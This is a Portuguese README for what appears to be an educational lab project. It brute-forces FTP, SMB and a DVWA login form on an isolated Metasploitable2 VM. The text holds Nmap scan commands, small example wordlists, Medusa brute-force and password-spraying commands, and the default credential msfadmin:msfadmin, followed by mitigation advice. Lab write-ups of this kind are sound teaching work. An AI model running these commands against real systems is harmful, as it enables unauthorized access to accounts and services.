# Projeto: Ataques de Força Bruta com Kali + Medusa (Ambiente Controlado)




Escopo: Metasploitable2 (VM em VirtualBox), rede Host-Only, IPs internal — testes realizados apenas neste ambiente controlado. 
Limitações: Testes realizados somente nas máquinas citadas e em rede isolada; nenhum teste foi executado em sistemas em produção ou em redes públicas.

Projeto: Ataques de Força Bruta com Kali + Medusa (Ambiente Controlado)


Resumo rápido: laboratório com duas VMs (Kali e Metasploitable/DVWA). Ataques de força bruta em FTP, formulário web (DVWA) e password spraying em SMB usando Medusa. Documentação com comandos, wordlists de exemplo, logs e recomendações de mitigação.


## Conteúdo do repositório
- `report.md` — relatório técnico detalhado (passo a passo).
- `commands.sh` — script com os comandos usados (exemplos).
- `wordlists/` — listas de usuários e senhas de demonstração.
- `screenshots/` — evidências (prints).
- `artifacts/` — logs e saídas do Medusa.


## Aviso legal
Este repositório contém material destinado a ambientes controlados e para fins educativos. Não execute estes comandos em sistemas sem autorização.


## Sumário
1. Objetivo
2. Preparação do ambiente
3. Comandos usados
4. Validação e evidências
5. Recomendações de mitigação
6. Como reproduzir

## Verifica se o host está ativo.

# 5.2 Mapeamento de portas e serviços (Nmap)

UDP scan:

sudo nmap -v -sU -p <PORTAS> <TARGET_IP>


## TCP SYN (stealth):

sudo nmap -v -sS <TARGET_IP>


## Versão do serviço + timing agressivo:

sudo nmap -v -T5 -sS -sV -p <PORTA> <TARGET_IP>


## Detecção completa (SO, versão, scripts):

sudo nmap -A <TARGET_IP>


## Detecção de sistema operacional:

sudo nmap -O <TARGET_IP>


## Ignorar discovery e mostrar só portas abertas:

sudo nmap -v -T5 -sS -Pn --open <TARGET_IP>


## Observações: -T5 é agressivo; para menos risco de instabilidade use -T4. Scans UDP são lentos e menos confiáveis.

# 5.3 Teste manual de FTP
ftp <TARGET_IP>


## Verifica se o serviço FTP responde e permite login manual.

# 5.4 Preparação de wordlists

## Usuários:

echo -e "user\nmsfadmin\nadmin\nroot" > user.txt


## Senhas:

echo -e "password\n123456\nwelcome\nmsfadmin" > senhas_spray.txt


(Use aspas normais " e echo -e com espaço.)

# 5.5 Ataques com Medusa

## Exemplo genérico:

medusa -h <TARGET_IP> -U users.txt -P senhas_spray.txt -M <serviço> -t 10


## Exemplo SMB:

medusa -h <TARGET_IP> -U smb_users.txt -P senhas_spray.txt -M smbnt -t 10 | tee artifacts/medusa-smb-output.txt


## Exemplo FTP (usuário único):

medusa -h <TARGET_IP> -u msfadmin -P wordlists/small-pass.txt -M ftp | tee artifacts/medusa-ftp-output.txt


## Atenção: -t define threads; threads muito altas podem derrubar serviços.

# 5.6 Validação SMB (smbclient)
smbclient -L //<TARGET_IP> -U msfadmin
## ou (não recomendado para repositório público)
smbclient -L //<TARGET_IP> -U msfadmin%msfadmin

# 6. Resultados (resumo)

FTP: credencial de exemplo msfadmin:msfadmin encontrada no ambiente de teste. Login confirmado manualmente via ftp. (Logs salvos em artifacts/medusa-ftp-output.txt — não publicados)

SMB: credencial msfadmin:msfadmin validada em ambiente de teste. (Logs salvos em artifacts/medusa-smb-output.txt)

DVWA (webform): com a wordlist reduzida não foram encontradas credenciais; é necessário ajustar campos do formulário ou usar wordlists maiores para testes mais amplos.

## Observação: os outputs reais foram mantidos localmente e não foram publicados por razões de segurança.

# 7. Análise de risco

Contas com senhas fracas permitem acesso não autorizado a serviços (FTP/SMB), podendo levar a movimentação lateral e exfiltração em ambientes reais.

Serviços desatualizados ou expostos sem segmentação aumentam a superfície de ataque.

# 8. Recomendações de mitigação

Forçar políticas de senha fortes e rotação periódica.

Implementar bloqueio/retardo após N tentativas de autenticação falhas.

Habilitar autenticação multifator (MFA) para acessos críticos.

Segmentar rede e limitar exposição de serviços via VPN ou regras de firewall.

Monitoramento e alertas para tentativas de brute force e padrões anômalos.

Atualizar serviços e corrigir vulnerabilidades conhecidas.

# 9. Como reproduzir (resumo rápido)

Provisionar VMs: Kali Linux + Metasploitable2 (DVWA).

Configurar VirtualBox: Host-Only/Internal network.

No Kali: sudo apt update && sudo apt install medusa nmap smbclient -y.

Preparar wordlists em wordlists/.

Executar nmap para mapear portas; executar medusa conforme comandos acima; validar manualmente com ftp/smbclient.

Salvar logs em artifacts/ (local) e screenshots em screenshots/ (privado).

# 10. Apêndices

commands.sh — script com os comandos usados (ex.: executar medusa e salvar saídas).

wordlists/ — listas de exemplo (pequenas).

DISCLAIMER.md e MIT-LICENSE.txt.





